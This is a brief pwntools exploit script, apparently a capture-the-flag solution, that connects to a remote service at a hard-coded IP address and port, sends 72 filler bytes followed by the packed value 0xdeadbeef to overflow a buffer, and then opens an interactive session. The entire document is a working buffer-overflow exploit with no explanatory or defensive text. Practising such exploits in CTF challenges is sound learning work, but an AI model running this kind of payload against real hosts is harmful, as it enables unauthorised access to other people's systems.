from pwn import *
p = remote('103.229.41.18', 5555)

str = "A" * 72
vuln = struct.pack("I", 0xdeadbeef)
payload = str + vuln
p.sendline(payload)

p.interactive()
